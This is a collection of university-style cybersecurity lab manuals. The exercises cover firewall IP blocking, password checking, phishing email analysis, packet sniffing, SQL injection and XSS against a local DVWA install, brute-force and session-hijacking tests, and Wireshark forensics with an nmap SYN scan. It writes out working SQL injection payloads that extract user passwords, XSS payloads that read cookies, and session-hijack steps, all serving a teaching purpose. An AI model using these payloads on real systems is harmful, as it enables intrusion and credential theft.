@@ -1,0 +1,1144 @@
+============================================================
+BASIC FIREWALL CONFIGURATION
+============================================================
+
+1. Software Requirements:
+   - Python 3.x
+   - Windows Operating System
+   - PowerShell
+   - Internet Connection
+   - Visual Studio Code / Any Python IDE
+
+2. Manual Firewall Configuration:
+   - Open "Windows Defender Firewall with Advanced Security".
+   - Click on "Inbound Rules".
+   - Click "New Rule" from the right panel.
+   - Select "Custom" → Click Next.
+   - Select "All Programs" → Click Next.
+   - Keep default Protocol and Ports settings → Click Next.
+
+3. Configure IP Blocking:
+   - Under Scope:
+     - Select "These IP addresses" under Remote IP address.
+     - Click "Add".
+     - Enter IP address to block (example: 1.2.3.4).
+     - Click OK → Next.
+
+4. Configure Action:
+   - Select "Block the connection".
+   - Click Next.
+
+5. Configure Profile:
+   - Select:
+     - Domain
+     - Private
+     - Public
+   - Click Next.
+
+6. Create Firewall Rule:
+   - Enter rule name (example: Manual_Block_IP).
+   - Click Finish.
+   - Incoming traffic from the specified IP will now be blocked.
+
+7. Create Python Program:
+   - Create a file named firewall.py.
+
+   Add the following code:
+
+   import requests, csv, subprocess
+
+   # source: Abuse CH
+   response = requests.get(
+   "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+   ).text
+
+   rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+   subprocess.run(["PowerShell", "-Command", rule])
+
+   mycsv = csv.reader(
+   filter(lambda x: not x.startswith("#"), response.splitlines())
+   )
+
+   for row in mycsv:
+       ip = row[1]
+
+       if ip != "dst_ip":
+           print("Added Rule to block:", ip)
+
+           rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
+
+           subprocess.run(["PowerShell", "-Command", rule])
+
+8. Open Command Prompt as Administrator:
+   - Search for Command Prompt.
+   - Right click → Run as Administrator.
+
+9. Navigate to Program Directory:
+   - Use cd command to move to folder containing firewall.py.
+
+   Example:
+
+   cd C:\Users\YourName\Desktop
+
+10. Verify Python Installation:
+    - Run:
+
+    python --version
+
+11. Install Required Library:
+    - Install requests module:
+
+    python -m pip install requests
+
+12. Execute the Program:
+    - Run:
+
+    python firewall.py
+
+13. Sample Output:
+
+    Added Rule to block: 45.9.148.221
+    Added Rule to block: 103.17.48.5
+    Added Rule to block: 185.234.219.12
+
+14. Verify Firewall Rules:
+    - Open Windows Defender Firewall with Advanced Security.
+    - Go to Outbound Rules.
+    - Search for rule name: BadIP.
+    - Multiple blocked IP entries will be visible.
+
+15. Result:
+    - Malicious IP addresses are automatically downloaded.
+    - Firewall rules are created dynamically.
+    - Incoming/Outgoing connections from malicious IPs are blocked.
+
+
+
+
+============================================================
+PASSWORD STRENGTH TESTING USING PYTHON
+============================================================
+
+import re
+
+def check_password_strength(password):
+
+   if len(password) < 8:
+       return "Weak: Password must be at least 8 characters long."
+
+   if not any(char.isdigit() for char in password):
+       return "Weak: Password must include at least one number."
+
+   if not any(char.isupper() for char in password):
+       return "Weak: Password must include at least one uppercase letter."
+
+   if not any(char.islower() for char in password):
+       return "Weak: Password must include at least one lowercase letter."
+
+   if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+       return "Medium: Add special characters to make your password stronger."
+
+   return "Strong: Your password is secure!"
+
+def password_checker():
+
+   print("Welcome to the Password Strength Checker!")
+
+   while True:
+
+       password = input("\nEnter your password (or type 'exit' to quit): ")
+
+       if password.lower() == "exit":
+           print("Thank you for using the Password Strength Checker! Goodbye!")
+           break
+
+       result = check_password_strength(password)
+       print(result)
+
+if __name__ == "__main__":
+   password_checker()
+
+
+
+
+============================================================
+ANALYZING PHISHING EMAILS
+============================================================
+
+1. Aim:
+   - To analyze a suspicious email using EML Analyzer and VirusTotal.
+   - To determine whether the email is phishing based on technical indicators.
+
+2. Tools Used:
+   - Online EML Analyzer
+   - VirusTotal
+   - Sample File:
+     2020-05-05-phishing-email-example-01.eml
+
+3. Upload EML File:
+   - Open the EML Analyzer website.
+   - Upload the sample .eml file.
+   - Wait for the analysis report.
+
+4. EML Analyzer Results:
+
+   Subject:
+   Warning: Final Notice
+
+   From:
+   malware-traffic-analysis.net Support
+   sues@nnwifi.com
+
+   To:
+   brad@malware-traffic-analysis.net
+
+   Content Type:
+   text/html
+
+   Message-ID:
+   Missing
+
+5. Header Analysis:
+
+   Sender IP Address:
+   94.100.31.27
+
+   Reverse DNS:
+   94-100-31-27.static.hvvc.us
+
+   Mail Server:
+   mail.nnwifi.com
+
+6. Authentication Results:
+
+   SPF:
+   Failed
+
+   DKIM:
+   Not Signed
+
+   DMARC:
+   Not Aligned
+
+7. VirusTotal Analysis:
+   - Open VirusTotal website.
+   - Search the sender IP:
+     94.100.31.27
+
+8. VirusTotal Results:
+
+   Detection Ratio:
+   1 / 93 vendors flagged as malicious
+
+   Location:
+   Netherlands
+
+   ASN:
+   AS29802 (HVC-AS)
+
+   Observation:
+   IP has suspicious reputation.
+
+9. Suspicious URL Identified:
+
+   https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net
+
+10. Reasons URL is Suspicious:
+    - Domain does not match sender domain.
+    - Uses foreign domain (.com.co).
+    - Attempts credential harvesting.
+    - Redirects user to suspicious external site.
+
+11. Answers to Given Questions:
+
+    1. Full sender email address:
+       sues@nnwifi.com
+
+    2. Domain used to send the email:
+       nnwifi.com
+
+    3. Sender IP address:
+       94.100.31.27
+
+    4. Is sender IP blacklisted?
+       Yes (1/93 vendors flagged it as malicious)
+
+    5. SPF authentication result:
+       Failed
+
+    6. Suspicious URL found in email body:
+       https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net
+
+12. Phishing Indicators Found:
+    - Urgent subject line:
+      "Warning: Final Notice"
+
+    - Fake display name impersonation.
+    - Sender domain unrelated to organization.
+    - SPF authentication failure.
+    - Missing Message-ID.
+    - HTML-only email.
+    - Suspicious external link.
+    - Sender IP partially flagged by VirusTotal.
+
+13. Conclusion:
+    - Multiple phishing indicators were identified.
+    - Sender authenticity failed verification checks.
+    - Email contains suspicious links and spoofed identity.
+
+14. Final Verdict:
+    - The email is classified as PHISHING.
+
+
+
+
+
+============================================================
+PACKET SNIFFING AND NETWORK TRAFFIC ANALYSIS
+============================================================
+
+1. Aim:
+   - To capture live network packets.
+   - To analyze network traffic using tcpdump and Wireshark.
+   - To understand how sensitive information is exposed in HTTP communication.
+
+2. Requirements:
+   - Kali Linux (Oracle VirtualBox)
+   - Wireshark
+   - Python 3
+   - Firefox Browser
+
+3. Open Kali Linux:
+   - Start the Kali Linux virtual machine.
+
+4. Open Terminal:
+   - Open terminal in Kali Linux.
+
+5. Start Local HTTP Server:
+   - Run the following command:
+
+   python3 -m http.server 8080
+
+   - This starts a local HTTP server on port 8080.
+
+6. Start Packet Capture:
+   - Open a new terminal.
+   - Run:
+
+   sudo tcpdump -i any -w capture.pcap port 8080
+
+   - tcpdump starts capturing packets on port 8080.
+   - Captured packets are stored in capture.pcap.
+
+7. Generate Network Traffic:
+   - Open Firefox browser in Kali Linux.
+   - Visit:
+
+   http://localhost:8080
+
+   - Refresh the page multiple times to generate HTTP traffic.
+
+8. Stop Packet Capture:
+   - Return to tcpdump terminal.
+   - Press:
+
+   Ctrl + C
+
+   - Packet capturing stops.
+   - Total captured packets are displayed.
+
+9. Locate Packet Capture File:
+   - Click Kali Linux dragon icon.
+   - Open File Manager.
+   - Open Home directory.
+   - Locate:
+
+   capture.pcap
+
+10. Open Capture File in Wireshark:
+    - Double click capture.pcap.
+    - File opens automatically in Wireshark.
+
+11. Filter Important HTTP Packets:
+    - In Wireshark filter bar, enter:
+
+    http.request.method == "POST"
+
+    - Press Enter.
+    - Only POST request packets are displayed.
+
+12. Analyze Packet Details:
+    - Select any captured packet.
+    - Observe the following information:
+      - Browser details
+      - Operating System
+      - Browser version
+      - Language information
+      - Visited URLs
+
+13. Observe Sensitive Data Exposure:
+    - If forms are submitted:
+      - Username can be seen.
+      - Password can be seen.
+    - Data is visible in plain text because HTTP is not encrypted.
+
+14. Conclusion:
+    - Network packets were successfully captured and analyzed.
+    - Sensitive information is visible in HTTP traffic.
+    - Packet sniffing demonstrates that HTTP communication is insecure.
+    - HTTPS encryption is necessary to protect sensitive data.
+
+
+
+
+
+============================================================
+SQL INJECTION ATTACK – CYBER SECURITY LAB EXPERIMENT
+============================================================
+
+1. Aim:
+   - To understand SQL Injection vulnerabilities.
+   - To learn how attackers bypass authentication and extract database information using improper input validation.
+
+2. Requirements:
+   - Kali Linux
+   - DVWA or WebGoat
+   - Apache Server
+   - MySQL / MariaDB
+   - Firefox Browser
+   - Basic SQL Knowledge
+
+3. Install DVWA:
+   - Open terminal in Kali Linux.
+   - Run:
+
+   sudo apt update
+   sudo apt install dvwa -y
+
+4. Start Required Services:
+   - Start Apache server:
+
+   sudo service apache2 start
+
+   - Start MySQL service:
+
+   sudo service mysql start
+
+5. Configure DVWA:
+   - Open configuration file:
+
+   sudo nano /etc/dvwa/config.inc.php
+
+   - Ensure database password is:
+
+   $_DVWA['db_password'] = '';
+
+   - Save and exit.
+
+6. Open DVWA in Browser:
+   - Open Firefox browser.
+   - Visit:
+
+   http://127.0.0.1/dvwa
+
+   - Login credentials:
+     - Username: admin
+     - Password: password
+
+   - Click:
+     Create / Reset Database
+
+7. Set DVWA Security Level:
+   - Navigate to DVWA Security.
+   - Set Security Level = Low.
+   - Click Submit.
+
+8. Open SQL Injection Module:
+   - Navigate:
+     DVWA → Vulnerabilities → SQL Injection
+
+   - An input box requesting User ID will appear.
+
+9. Perform Normal Input Test:
+   - Enter:
+
+   1
+
+   - User details are displayed normally.
+
+10. Perform Authentication Bypass:
+    - Enter:
+
+    1' OR '1'='1
+
+    - Result:
+      All user records are displayed.
+
+    - Confirms SQL Injection vulnerability.
+
+11. Find Number of Columns:
+    - Execute:
+
+    1' ORDER BY 1-- -
+    1' ORDER BY 2-- -
+    1' ORDER BY 3-- -
+
+    - Continue until error occurs.
+    - Last successful query indicates total columns.
+
+12. Perform UNION-Based Injection:
+    - Execute:
+
+    1' UNION SELECT 1,2-- -
+
+13. Extract Database Name:
+    - Execute:
+
+    1' UNION SELECT database(),2-- -
+
+14. Extract Table Names:
+    - Execute:
+
+    1' UNION SELECT table_name,2
+    FROM information_schema.tables
+    WHERE table_schema=database()-- -
+
+15. Extract Column Names:
+    - Execute:
+
+    1' UNION SELECT column_name,2
+    FROM information_schema.columns
+    WHERE table_name='users'-- -
+
+16. Extract Username and Password:
+    - Execute:
+
+    1' UNION SELECT user,password FROM users-- -
+
+    - Passwords may appear as hashes.
+
+17. Result:
+    - SQL Injection attack was successfully performed.
+    - Authentication bypass was achieved.
+    - Database information was extracted.
+    - Improper input validation vulnerability was identified.
+
+18. Conclusion:
+    - Unsanitized user input causes SQL Injection vulnerabilities.
+    - Attackers can gain unauthorized database access.
+    - Proper security measures are necessary to secure applications.
+
+19. Prevention Techniques:
+    - Prepared Statements
+    - Parameterized Queries
+    - Input Validation
+    - Input Sanitization
+    - Stored Procedures
+    - Web Application Firewall (WAF)
+    - Least Privilege Access
+
+20. Viva Questions:
+    1. What is SQL Injection?
+    2. Why does ' OR '1'='1 work?
+    3. Difference between Union-based and Error-based SQL Injection?
+    4. What is information_schema?
+    5. How to prevent SQL Injection?
+
+
+
+
+
+
+============================================================
+FINDING & EXPLOITING XSS VULNERABILITIES USING DVWA ON KALI LINUX
+============================================================
+
+1. Aim:
+   - To identify and exploit Cross-Site Scripting (XSS) vulnerabilities using DVWA on Kali Linux.
+
+2. Requirements:
+   - Kali Linux
+   - DVWA (Damn Vulnerable Web Application)
+   - Firefox / Chromium Browser
+   - Apache Server
+   - MySQL Service
+
+3. Start Required Services:
+   - Open terminal in Kali Linux.
+   - Start Apache service:
+
+   sudo service apache2 start
+
+   - Start MySQL service:
+
+   sudo service mysql start
+
+4. Open DVWA:
+   - Open browser.
+   - Visit:
+
+   http://localhost/dvwa
+
+   - Login credentials:
+     - Username: admin
+     - Password: password
+
+5. Configure DVWA Security:
+   - Navigate to:
+     DVWA Security
+
+   - Set Security Level:
+     Low
+
+   - Click Submit.
+
+6. Understanding XSS:
+   - Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into webpages.
+   - Types of XSS in DVWA:
+     - Reflected XSS
+     - Stored XSS
+     - DOM Based XSS
+
+7. Perform Reflected XSS Test:
+   - Navigate to:
+     DVWA → XSS (Reflected)
+
+   - Enter payload:
+
+   <script>alert('XSS')</script>
+
+   - Click Submit.
+
+   - Result:
+     Popup alert appears.
+     Reflected XSS vulnerability confirmed.
+
+8. Perform Stored XSS Test:
+   - Navigate to:
+     DVWA → XSS (Stored)
+
+   - Fill the form:
+
+     Name:
+     <h1>Hacked</h1>
+
+     Message:
+     <script>alert('Stored XSS')</script>
+
+   - Click:
+     Sign Guestbook
+
+   - Refresh page.
+
+   - Result:
+     Popup appears every time page loads.
+     Stored XSS vulnerability confirmed.
+
+9. Perform DOM Based XSS:
+   - Navigate to:
+     DVWA → XSS (DOM)
+
+   - In browser URL bar append:
+
+   #<script>alert('DOM XSS')</script>
+
+   - Press Enter.
+
+   - Result:
+     Popup alert appears.
+     DOM Based XSS vulnerability confirmed.
+
+10. Demonstrate Cookie Access:
+    - In Stored XSS Message field enter:
+
+    <script>alert(document.cookie)</script>
+
+    - Result:
+      Browser session cookies are displayed.
+      Demonstrates session theft possibility.
+
+11. Change Security Level:
+    - Navigate to:
+      DVWA Security
+
+    - Set security level:
+      Medium
+
+    - Repeat payloads and observe filtering.
+
+    - Set security level:
+      High
+
+    - Repeat payloads again.
+
+    - Observe how stronger filtering blocks attacks.
+
+12. Result:
+    - Reflected, Stored, and DOM Based XSS vulnerabilities were successfully identified and exploited.
+    - Session cookies could be accessed through JavaScript.
+    - Security filtering at Medium and High levels reduced vulnerability exploitation.
+
+13. Conclusion:
+    - XSS vulnerabilities occur due to improper input validation and output encoding.
+    - Attackers can inject malicious scripts into webpages.
+    - Proper sanitization and secure coding practices are necessary to prevent XSS attacks.
+
+
+
+
+
+============================================================
+TESTING AUTHENTICATION WEAKNESSES AND SESSION MANAGEMENT USING KALI LINUX & DVWA
+============================================================
+
+1. Aim:
+   - To identify authentication weaknesses and session management vulnerabilities using DVWA on Kali Linux.
+
+2. Requirements:
+
+   Software:
+   - Kali Linux
+   - DVWA
+   - Firefox Browser
+
+   Hardware:
+   - Computer System with Internet Disabled
+
+3. Theory:
+   - Weak authentication occurs due to:
+     - Weak passwords
+     - No account lockout
+     - Brute force vulnerability
+     - Default credentials
+
+   - Improper session management leads to:
+     - Session hijacking
+     - Session fixation
+     - Reuse of old session IDs
+     - Insecure cookies
+
+4. Start Required Services:
+   - Open terminal.
+   - Start Apache service:
+
+   sudo service apache2 start
+
+   - Start MySQL service:
+
+   sudo service mysql start
+
+5. Open DVWA:
+   - Open Firefox browser.
+   - Visit:
+
+   http://127.0.0.1/dvwa
+
+6. Login to DVWA:
+   - Username:
+     admin
+
+   - Password:
+     password
+
+7. Configure Security Level:
+   - Navigate to:
+     DVWA Security
+
+   - Set Security Level:
+     LOW
+
+   - Click Submit.
+
+============================================================
+PART A – TESTING AUTHENTICATION WEAKNESSES
+============================================================
+
+8. Open Brute Force Module:
+   - Navigate to:
+     DVWA → Vulnerabilities → Brute Force
+
+9. Test Weak Password Authentication:
+   - Enter:
+     Username: admin
+     Password: password
+
+   - Observation:
+     Successful login indicates weak authentication.
+
+10. Perform Manual Brute Force Attack:
+
+    Attempt 1:
+    - Username: admin
+    - Password: admin
+
+    Attempt 2:
+    - Username: admin
+    - Password: 123456
+
+    Attempt 3:
+    - Username: admin
+    - Password: password
+
+    - Observation:
+      Login successful.
+      DVWA allows unlimited attempts without account lockout.
+
+11. Result of Brute Force Testing:
+    - Weak password accepted.
+    - No rate limiting.
+    - No account lock mechanism.
+    - Brute force vulnerability confirmed.
+
+============================================================
+PART B – TESTING SESSION MANAGEMENT VULNERABILITIES
+============================================================
+
+12. Session ID Analysis:
+    - Login to DVWA.
+    - Right click → Inspect.
+    - Navigate:
+      Storage → Cookies
+
+    - Observe:
+      PHPSESSID cookie.
+
+    Example:
+    PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
+
+    - Observation:
+      Session ID visible in plain text.
+
+13. Perform Session Hijacking:
+
+    Step 1:
+    - Login normally as admin.
+
+    Step 2:
+    - Copy PHPSESSID from browser cookies.
+
+    Step 3:
+    - Open Private Window:
+      Ctrl + Shift + P
+
+    Step 4:
+    - Open:
+      http://127.0.0.1/dvwa
+
+    Step 5:
+    - Replace PHPSESSID cookie with copied value.
+
+    Step 6:
+    - Refresh page.
+
+    - Result:
+      Logged in without entering credentials.
+      Session hijacking successful.
+
+14. Perform Session Fixation:
+
+    Step 1:
+    - Open DVWA login page without logging in.
+
+    Step 2:
+    - Observe PHPSESSID before login.
+
+    Step 3:
+    - Login using admin credentials.
+
+    Step 4:
+    - Observe PHPSESSID again.
+
+    Vulnerable Case:
+    - Same session ID before and after login.
+
+    Secure Case:
+    - Session ID regenerated after login.
+
+    - Observation:
+      Same session ID indicates session fixation vulnerability.
+
+15. Test Improper Logout:
+
+    Step 1:
+    - Login normally.
+
+    Step 2:
+    - Copy PHPSESSID cookie.
+
+    Step 3:
+    - Logout from DVWA.
+
+    Step 4:
+    - Open Private Window.
+
+    Step 5:
+    - Paste old PHPSESSID cookie.
+
+    Step 6:
+    - Open:
+      http://127.0.0.1/dvwa/index.php
+
+    - Result:
+      Access granted without login.
+      Old session remained active.
+
+============================================================
+OBSERVATIONS & RESULTS
+============================================================
+
+16. Observations:
+
+    Weak Password Login:
+    Successful
+
+    Brute Force Attack:
+    Allowed
+
+    Session ID Exposure:
+    Found
+
+    Session Hijacking:
+    Possible
+
+    Session Fixation:
+    Observed
+
+    Improper Logout:
+    Observed
+
+17. Conclusion:
+    - Authentication and session management vulnerabilities were successfully identified.
+    - Weak authentication enables brute force attacks.
+    - Poor session handling allows unauthorized access.
+    - Secure authentication and proper session management are necessary to prevent attacks.
+
+18. Viva Questions:
+    1. What is authentication?
+    2. What is brute force attack?
+    3. What is session hijacking?
+    4. What is session fixation?
+    5. How can session attacks be prevented?
+
+
+
+
+============================================================
+NETWORK FORENSICS USING WIRESHARK
+============================================================
+
+1. Aim:
+   - To capture and analyze network packets using Wireshark.
+   - To understand network forensics techniques.
+
+2. Objective:
+   - Learn packet capturing using Wireshark.
+   - Analyze different network protocols.
+   - Apply filters for identifying specific traffic.
+   - Understand suspicious network activity detection.
+
+3. Requirements:
+   - Kali Linux
+   - Wireshark
+
+============================================================
+PART A – PACKET CAPTURING
+============================================================
+
+4. Launch Wireshark:
+   - Open Kali Linux terminal.
+   - Run:
+
+   wireshark &
+
+5. Select Network Interface:
+   - Select:
+     eth0
+
+   - Wireshark starts capturing packets.
+
+6. Protocol Analysis:
+   - Analyze protocols such as:
+     - TCP
+     - UDP
+     - HTTP
+
+   - Apply filter:
+
+   tcp
+
+   - Only TCP packets are displayed.
+
+   - Similarly try:
+     - udp
+     - http
+
+============================================================
+PART B – APPLYING FILTERS
+============================================================
+
+7. Filter Packets by IP Address:
+   - Apply filter:
+
+   ip.addr == 192.168.0.161
+
+   - Displays packets related to the specified IP address.
+
+8. Filter by Source Address:
+   - Apply filter:
+
+   ip.src == 192.168.0.161
+
+   - Displays packets originating from the specified source IP.
+
+============================================================
+PART C – TCP STREAM ANALYSIS
+============================================================
+
+9. Follow TCP Stream:
+   - Right click any TCP packet.
+   - Select:
+     Follow → TCP Stream
+
+10. Observations from TCP Stream:
+    - Complete communication between two devices is reconstructed.
+
+    - Color Representation:
+      - Red text:
+        Data sent from one device.
+
+      - Blue text:
+        Data sent from another device.
+
+11. Analyze TCP Session:
+    - Mixed binary and readable data may appear.
+    - Indicates:
+      - HTTPS traffic
+      - Encrypted communication
+      - Application-level data
+
+12. TCP Flags Observed:
+    - SYN:
+      Connection start
+
+    - ACK:
+      Acknowledgement
+
+    - PSH:
+      Data transfer
+
+    - FIN:
+      Connection close
+
+    - Observation:
+      Full TCP session lifecycle identified.
+
+============================================================
+PART D – IDENTIFYING SUSPICIOUS TRAFFIC
+============================================================
+
+13. Perform Port Scan using Nmap:
+    - Open Kali Linux terminal.
+    - Run:
+
+    nmap -sS <target_IP>
+
+    Example:
+
+    nmap -sS 192.168.0.156
+
+14. Detect SYN Scan in Wireshark:
+    - Apply filter:
+
+    tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+15. Observations:
+    - Multiple SYN packets detected.
+    - Different destination ports observed.
+    - Incomplete TCP connections identified.
+    - Source:
+      Kali Linux
+
+    - Destination:
+      Windows Machine
+
+    - Indicates suspicious port scanning behavior.
+
+============================================================
+PART E – WIRESHARK STATISTICS
+============================================================
+
+16. Capture File Properties:
+    - Navigate:
+      Statistics → Capture File Properties
+
+    - Displays summary of captured traffic.
+
+17. Resolved Addresses:
+    - Navigate:
+      Statistics → Resolved Addresses
+
+    - Converts IP and MAC addresses into readable names.
+
+18. Protocol Hierarchy:
+    - Navigate:
+      Statistics → Protocol Hierarchy
+
+    - Displays protocol distribution and packet counts.
+
+19. Conversations:
+    - Navigate:
+      Statistics → Conversations
+
+    - Displays communication between endpoints.
+
+20. Packet Length:
+    - Navigate:
+      Statistics → Packet Length
+
+    - Displays packet size distribution.
+
+21. Endpoints:
+    - Navigate:
+      Statistics → Endpoints
+
+    - Displays devices involved in communication.
+
+22. I/O Graphs:
+    - Navigate:
+      Statistics → I/O Graphs
+
+    - Displays traffic trends over time.
+
+============================================================
+RESULT
+============================================================
+
+23. Result:
+    - Network packets were successfully captured and analyzed.
+    - Different protocols and communication patterns were observed.
+    - Suspicious traffic behavior was identified using Wireshark.
+
+============================================================
+CONCLUSION
+============================================================
+
+24. Conclusion:
+    - Wireshark is an effective network forensics tool.
+    - It helps analyze network traffic and detect suspicious activities.
+    - Useful in cybersecurity investigations and incident analysis.
+
+============================================================
+VIVA QUESTIONS
+============================================================
+
+25. Viva Questions:
+    1. What is packet sniffing?
+    2. Difference between TCP and UDP?
+    3. What is a protocol analyzer?
+    4. What is a filter in Wireshark?
+
+
+
+
+
+
